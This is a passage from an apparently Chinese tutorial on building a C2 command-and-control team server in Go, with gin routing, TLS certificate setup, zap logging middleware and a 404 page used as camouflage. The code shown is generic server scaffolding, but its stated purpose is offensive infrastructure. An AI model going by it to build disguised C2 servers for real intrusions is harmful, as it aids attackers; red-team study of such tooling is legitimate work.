class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fileMustExist</span><span class="params">(path, name <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> path == <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s must be set&quot;</span>, name)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> _, err := os.Stat(path); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">if</span> os.IsNotExist(err) &#123;  </span><br><span class="line">          <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s: file does not exist&quot;</span>, name)  </span><br><span class="line">       &#125;  </span><br><span class="line">       <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%s: %w&quot;</span>, name, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ValidUriString</span><span class="params">(s <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;  </span><br><span class="line">    re := regexp.MustCompile(<span class="string">`^/(?:[a-zA-Z0-9-_.]+(?:/[a-zA-Z0-9-_.]+)*)?$`</span>)  </span><br><span class="line">    <span class="keyword">return</span> re.MatchString(s)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了保护客户端和服务器之间的通信安全，大多数C2框架都会采用*.crt和*.key启用流量加密，当然 <code>“crt + key”</code> 只是起点，在高强度的网络对抗中还使用<strong>双向TLS（mTLS）</strong>、<strong>证书校验</strong>、<strong>防篡改</strong>等安全机制。</p>
<p>生成自签名 RSA-2048 服务器证书（<strong>server.crt</strong>）和对应的<strong>私钥</strong>（<strong>server.key</strong>），有效期<strong>10 年</strong>，并且不带密码保护私钥。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -nodes -newkey rsa:2048 -keyout server.key -out server.crt -days 3650</span><br></pre></td></tr></table></figure>

<p>生成*.crt和*.key后需要将这两个文件放置到服务器的static目录。</p>
<h2 id="1-3-路由注册"><a href="#1-3-路由注册" class="headerlink" title="1.3 路由注册"></a>1.3 路由注册</h2><p><code>controller/types.go</code>。TeamServer接口并未定义需要用到的方法，后续会增加。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> TeamServer <span class="keyword">interface</span> &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> Controller <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Host     <span class="type">string</span>  </span><br><span class="line">    Port     <span class="type">int</span>  </span><br><span class="line">    Endpoint <span class="type">string</span>  </span><br><span class="line">    Hash     <span class="type">string</span>  </span><br><span class="line">    Cert     <span class="type">string</span>  </span><br><span class="line">    Key      <span class="type">string</span>  </span><br><span class="line">  </span><br><span class="line">    TeamServer TeamServer  </span><br><span class="line">    Engine     *gin.Engine  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <code>controller</code>是<strong>C2服务端的控制器</strong>，负责挂载日志、恢复、伪装（404）等中间件，并给相应的路由绑定路由处理函数，所有client的请求都先通过它再由它分发到具体的业务逻辑，这是传统“MVC”框架中的“<strong>Controller</strong>”部分，也充当了部分服务器的角色。</p>
<p><code>controller/controller.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/middlewares&quot;</span>  </span><br><span class="line">    <span class="string">&quot;OneServer/profile&quot;</span>    </span><br><span class="line">    <span class="string">&quot;OneServer/utils/crypt&quot;</span>    </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewController</span><span class="params">(ts TeamServer, tsProfile profile.Profile)</span></span> *Controller &#123;  </span><br><span class="line">  </span><br><span class="line">    gin.SetMode(tsProfile.TeamServerConfig.Env)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> tsProfile.ServerResponseConfig.PagePath != <span class="string">&quot;&quot;</span> &#123;  </span><br><span class="line">       fileContent, _ := os.ReadFile(tsProfile.ServerResponseConfig.PagePath)  </span><br><span class="line">       tsProfile.ServerResponseConfig.Page = <span class="type">string</span>(fileContent)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    controller := <span class="built_in">new</span>(Controller)  </span><br><span class="line">    controller.Host = tsProfile.TeamServerConfig.Host  </span><br><span class="line">    controller.Port = tsProfile.TeamServerConfig.Port  </span><br><span class="line">    controller.Endpoint = tsProfile.TeamServerConfig.Endpoint  </span><br><span class="line">    controller.Hash = crypt.SHA256([]<span class="type">byte</span>(tsProfile.TeamServerConfig.Password))  </span><br><span class="line">    controller.Cert = tsProfile.TeamServerConfig.Cert  </span><br><span class="line">    controller.Key = tsProfile.TeamServerConfig.Key  </span><br><span class="line">    controller.TeamServer = ts  </span><br><span class="line">  </span><br><span class="line">    router := gin.Default()</span><br><span class="line">  </span><br><span class="line">    router.Use(middlewares.GinLogger(), middlewares.GinRecovery(<span class="literal">true</span>))  </span><br><span class="line">    router.Use(middlewares.Default404Middleware(tsProfile.ServerResponseConfig))  </span><br><span class="line">  </span><br><span class="line">    controller.Engine = router  </span><br><span class="line">    controller.InitRouter()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> controller  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Controller)</span></span> InitRouter() &#123;  </span><br><span class="line">  </span><br><span class="line">    apiGroup := c.Engine.Group(c.Endpoint)  </span><br><span class="line">  </span><br><span class="line">    apiGroup.GET(<span class="string">&quot;/test&quot;</span>, c.Test)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>utils/crypt/hash.go</code> 生成SHA256哈希值</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> crypt  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;crypto/sha256&quot;</span>  </span><br><span class="line">    <span class="string">&quot;encoding/hex&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SHA256</span><span class="params">(data []<span class="type">byte</span>)</span></span> <span class="type">string</span> &#123;  </span><br><span class="line">    hash := sha256.New()  </span><br><span class="line">    hash.Write(data)  </span><br><span class="line">    hashBytes := hash.Sum(<span class="literal">nil</span>)  </span><br><span class="line">    <span class="keyword">return</span> hex.EncodeToString(hashBytes)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了下文的1.6的接口测试，需要定义测试的接口以验证服务器是否能正常提供服务。</p>
<p><code>controller/test.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>  </span><br><span class="line">    <span class="string">&quot;net/http&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Test 返回一个固定的 hello oneday 页面，用于 1.5 接口连通性验证  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Controller)</span></span> Test(ctx *gin.Context) &#123;  </span><br><span class="line">    ctx.Header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=utf-8&quot;</span>)  </span><br><span class="line">    ctx.String(http.StatusOK,  </span><br><span class="line">       <span class="string">`&lt;!DOCTYPE html&gt;  </span></span><br><span class="line"><span class="string">&lt;html&gt;  </span></span><br><span class="line"><span class="string">&lt;head&gt;  </span></span><br><span class="line"><span class="string">    &lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;  </span></span><br><span class="line"><span class="string">&lt;body&gt;  </span></span><br><span class="line"><span class="string">    &lt;h1&gt;hello oneday&lt;/h1&gt;&lt;/body&gt;  </span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-4-中间件与日志器"><a href="#1-4-中间件与日志器" class="headerlink" title="1.4 中间件与日志器"></a>1.4 中间件与日志器</h2><p>gin框架允许我们自定义中间件，<strong>以“洋葱模型”灵活地插入任何横切逻辑</strong>，而无需改动业务代码本身。当接收到client的路由请求时，Gin会按照使用中间件的顺序依次调用，最后再处理业务逻辑。</p>
<p>controller用到了<strong>GinLogger、GinRecovery、404</strong>中间件，为了实现方便我并未添加jwt鉴权中间件，有需要的师傅自行添加，或者等我后续开源完整的C2框架。</p>
<p>这是我从别的项目找的<strong>生产级Gin中间件</strong>，用<strong>Zap</strong>做日志，功能上完全替代了 <code>gin.Logger()</code> 和 <code>gin.Recovery()</code>，而且更强大、更灵活。</p>
<ul>
<li><code>GinLogger</code>：是一个<strong>轻量级、结构化、可观测的HTTP请求日志中间件</strong>，用Zap输出到控制台（可通profile.json关闭）和日志中，包含 <strong>状态码、耗时、IP、UA</strong> 等关键信息，方便你快速定位问题、做性能分析。</li>
<li><code>GinRecovery</code>：任何panic 都会被捕获，且<strong>不宕机</strong>，能打印堆栈。</li>
</ul>
<p><code>middlewares/logger.go</code>如果看不懂只管用就完事了</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> middlewares  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/logs&quot;</span>  </span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span>    </span><br><span class="line">    <span class="string">&quot;go.uber.org/zap&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net/http&quot;</span>    </span><br><span class="line">    <span class="string">&quot;net/http/httputil&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>    </span><br><span class="line">    <span class="string">&quot;runtime/debug&quot;</span>    </span><br><span class="line">    <span class="string">&quot;strings&quot;</span>    </span><br><span class="line">    <span class="string">&quot;time&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// GinLogger 是一个 Gin 中间件，用于记录请求日志。  </span></span><br><span class="line"><span class="comment">// 该中间件会在每次请求结束后，使用 Zap 日志记录请求信息。  </span></span><br><span class="line"><span class="comment">// 通过此中间件，可以方便地追踪每个请求的情况以及性能。  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GinLogger</span><span class="params">()</span></span> gin.HandlerFunc &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;  </span><br><span class="line">       <span class="comment">// 记录请求开始时间  </span></span><br><span class="line">       start := time.Now()  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 获取请求的路径和查询参数  </span></span><br><span class="line">       path := c.Request.URL.Path  </span><br><span class="line">       query := c.Request.URL.RawQuery  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 继续执行后续的处理  </span></span><br><span class="line">       c.Next()  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 计算请求处理的耗时  </span></span><br><span class="line">       cost := time.Since(start)  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// 使用 Zap 记录请求日志  </span></span><br><span class="line">       logs.Logger.Info(path,  </span><br><span class="line">          <span class="comment">// 记录响应状态码  </span></span><br><span class="line">          zap.Int(<span class="string">&quot;status&quot;</span>, c.Writer.Status()),  </span><br><span class="line">          <span class="comment">// 记录请求方法  </span></span><br><span class="line">          zap.String(<span class="string">&quot;method&quot;</span>, c.Request.Method),  </span><br><span class="line">          <span class="comment">// 记录请求路径  </span></span><br><span class="line">          zap.String(<span class="string">&quot;path&quot;</span>, path),  </span><br><span class="line">          <span class="comment">// 记录查询参数  </span></span><br><span class="line">          zap.String(<span class="string">&quot;query&quot;</span>, query),  </span><br><span class="line">          <span class="comment">// 记录客户端 IP          zap.String(&quot;ip&quot;, c.ClientIP()),  </span></span><br><span class="line">          <span class="comment">// 记录 User-Agent 信息  </span></span><br><span class="line">          zap.String(<span class="string">&quot;user-agent&quot;</span>, c.Request.UserAgent()),  </span><br><span class="line">          <span class="comment">// 记录错误信息（如果有）  </span></span><br><span class="line">          zap.String(<span class="string">&quot;errors&quot;</span>, c.Errors.ByType(gin.ErrorTypePrivate).String()),  </span><br><span class="line">          <span class="comment">// 记录请求耗时  </span></span><br><span class="line">          zap.Duration(<span class="string">&quot;cost&quot;</span>, cost),  </span><br><span class="line">       )  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// GinRecovery 是一个 Gin 中间件，用于捕获和处理请求中的 panic 错误。  </span></span><br><span class="line"><span class="comment">// 该中间件的主要作用是确保服务在遇到未处理的异常时不会崩溃，并通过日志系统提供详细的错误追踪。  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GinRecovery</span><span class="params">(stack <span class="type">bool</span>)</span></span> gin.HandlerFunc &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;  </span><br><span class="line">       <span class="comment">// 使用 defer 确保 panic 被捕获，并且处理函数会在 panic 后执行  </span></span><br><span class="line">       <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;  </span><br><span class="line">          <span class="comment">// 检查是否发生了 panic 错误  </span></span><br><span class="line">          <span class="keyword">if</span> err := <span class="built_in">recover</span>(); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">             <span class="comment">// 检查是否是连接被断开的问题（如 broken pipe），这些错误不需要记录堆栈信息  </span></span><br><span class="line">             <span class="keyword">var</span> brokenPipe <span class="type">bool</span>  </span><br><span class="line">             <span class="keyword">if</span> ne, ok := err.(*net.OpError); ok &#123;  </span><br><span class="line">                <span class="keyword">if</span> se, ok := ne.Err.(*os.SyscallError); ok &#123;  </span><br><span class="line">                   <span class="keyword">if</span> strings.Contains(strings.ToLower(se.Error()), <span class="string">&quot;broken pipe&quot;</span>) || strings.Contains(strings.ToLower(se.Error()), <span class="string">&quot;connection reset by peer&quot;</span>) &#123;  </span><br><span class="line">                      brokenPipe = <span class="literal">true</span>  </span><br><span class="line">                   &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">             &#125;  </span><br><span class="line">  </span><br><span class="line">             <span class="comment">// 获取请求信息，包括请求体等  </span></span><br><span class="line">             httpRequest, _ := httputil.DumpRequest(c.Request, <span class="literal">false</span>)  </span><br><span class="line">  </span><br><span class="line">             <span class="comment">// 如果是 broken pipe 错误，则只记录错误信息，不记录堆栈信息  </span></span><br><span class="line">             <span class="keyword">if</span> brokenPipe &#123;  </span><br><span class="line">                logs.Logger.Error(c.Request.URL.Path,  </span><br><span class="line">                   zap.Any(<span class="string">&quot;error&quot;</span>, err),  </span><br><span class="line">                   zap.String(<span class="string">&quot;request&quot;</span>, <span class="type">string</span>(httpRequest)),  </span><br><span class="line">                )  </span><br><span class="line">                <span class="comment">// 由于连接断开，不能再向客户端写入状态码  </span></span><br><span class="line">                _ = c.Error(err.(<span class="type">error</span>)) <span class="comment">// nolint: errcheck  </span></span><br><span class="line">                c.Abort()                <span class="comment">// 中止请求处理  </span></span><br><span class="line">                <span class="keyword">return</span>  </span><br><span class="line">             &#125;  </span><br><span class="line">  </span><br><span class="line">             <span class="comment">// 如果是其他类型的 panic，根据 `stack` 参数决定是否记录堆栈信息  </span></span><br><span class="line">             <span class="keyword">if</span> stack &#123;  </span><br><span class="line">                <span class="comment">// 记录详细的错误和堆栈信息  </span></span><br><span class="line">                logs.Logger.Error(<span class="string">&quot;[Recovery from panic]&quot;</span>,  </span><br><span class="line">                   zap.Any(<span class="string">&quot;error&quot;</span>, err),  </span><br><span class="line">                   zap.String(<span class="string">&quot;request&quot;</span>, <span class="type">string</span>(httpRequest)),  </span><br><span class="line">                   zap.String(<span class="string">&quot;stack&quot;</span>, <span class="type">string</span>(debug.Stack())),  </span><br><span class="line">                )  </span><br><span class="line">             &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 只记录错误信息，不记录堆栈  </span></span><br><span class="line">                logs.Logger.Error(<span class="string">&quot;[Recovery from panic]&quot;</span>,  </span><br><span class="line">                   zap.Any(<span class="string">&quot;error&quot;</span>, err),  </span><br><span class="line">                   zap.String(<span class="string">&quot;request&quot;</span>, <span class="type">string</span>(httpRequest)),  </span><br><span class="line">                )  </span><br><span class="line">             &#125;  </span><br><span class="line">             <span class="comment">// 返回 500 错误状态码，表示服务器内部错误  </span></span><br><span class="line">             c.AbortWithStatus(http.StatusInternalServerError)  </span><br><span class="line">          &#125;  </span><br><span class="line">       &#125;()  </span><br><span class="line">       <span class="comment">// 继续执行后续的请求处理  </span></span><br><span class="line">       c.Next()  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>GinLogger</code> 和 <code>GinRecovery</code> 两个中间件都用到Zap日志，<code>Zap</code> 是 <strong>Uber 开源的高性能、结构化日志库</strong>，专为<strong>Go</strong>设计，日志字段以 <strong>JSON</strong> 形式输出。不用搞懂，直接用就完事了。</p>
<p><code>logs/zapLogger.go</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> logs  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> (  </span><br><span class="line">    <span class="string">&quot;OneServer/profile&quot;</span>  </span><br><span class="line">    <span class="string">&quot;go.uber.org/zap&quot;</span>    </span><br><span class="line">    <span class="string">&quot;go.uber.org/zap/zapcore&quot;</span>    </span><br><span class="line">    <span class="string">&quot;gopkg.in/natefinch/lumberjack.v2&quot;</span>    </span><br><span class="line">    <span class="string">&quot;log&quot;</span>    </span><br><span class="line">    <span class="string">&quot;os&quot;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> Logger *zap.Logger  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// InitLogger 初始化并返回一个基于配置设置的新 zap.Logger 实例  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitLogger</span><span class="params">(zapCfg profile.ZapConfig)</span></span> *zap.Logger &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 创建一个用于日志输出的 </span></span><br><span class="line">    writeSyncer    writeSyncer := getLogWriter(zapCfg.Path, zapCfg.MaxSize, zapCfg.MaxBackups, zapCfg.MaxAge)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 如果配置了控制台输出，则添加控制台输出  </span></span><br><span class="line">    <span class="keyword">if</span> zapCfg.IsConsolePrint &#123;  </span><br><span class="line">       writeSyncer = zapcore.NewMultiWriteSyncer(writeSyncer, zapcore.AddSync(os.Stdout))  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 创建日志格式化的编码器  </span></span><br><span class="line">    encoder := getEncoder()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 根据配置确定日志级别  </span></span><br><span class="line">    <span class="keyword">var</span> logLevel zapcore.Level  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> err := logLevel.UnmarshalText([]<span class="type">byte</span>(zapCfg.Level)); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;Failed to parse logs level: %v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 创建核心和日志实例  </span></span><br><span class="line">    core := zapcore.NewCore(encoder, writeSyncer, logLevel)  </span><br><span class="line">    Logger = zap.New(core, zap.AddCaller())  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> Logger  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// getLogWriter 返回一个 zapcore.WriteSyncer，该写入器利用 lumberjack 包，实现日志的滚动记录  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getLogWriter</span><span class="params">(filename <span class="type">string</span>, maxSize, maxBackups, maxAge <span class="type">int</span>)</span></span> zapcore.WriteSyncer &#123;  </span><br><span class="line">    lumberJackLogger := &amp;lumberjack.Logger&#123;  </span><br><span class="line">       Filename:   filename,   <span class="comment">// 日志文件的位置  </span></span><br><span class="line">       MaxSize:    maxSize,    <span class="comment">// 在进行切割之前，日志文件的最大大小（以MB为单位）  </span></span><br><span class="line">       MaxBackups: maxBackups, <span class="comment">// 保留旧文件的最大个数  </span></span><br><span class="line">       MaxAge:     maxAge,     <span class="comment">// 保留旧文件的最大天数  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> zapcore.AddSync(lumberJackLogger)  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// getEncoder 返回一个为生产日志配置的 JSON 编码器  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getEncoder</span><span class="params">()</span></span> zapcore.Encoder &#123;  </span><br><span class="line">    encoderConfig := zap.NewProductionEncoderConfig()  </span><br><span class="line">    encoderConfig.EncodeTime = zapcore.ISO8601TimeEncoder  </span><br><span class="line">    encoderConfig.TimeKey = <span class="string">&quot;time&quot;</span>  </span><br><span class="line">    encoderConfig.EncodeLevel = zapcore.CapitalLevelEncoder  </span><br><span class="line">    encoderConfig.EncodeDuration = zapcore.SecondsDurationEncoder  </span><br><span class="line">    encoderConfig.EncodeCaller = zapcore.ShortCallerEncoder  </span><br><span class="line">    <span class="keyword">return</span> zapcore.NewJSONEncoder(encoderConfig)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后一个中间件，用于如果访问到了不存在的接口时直接返回404页面</p>
<p><code>404.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 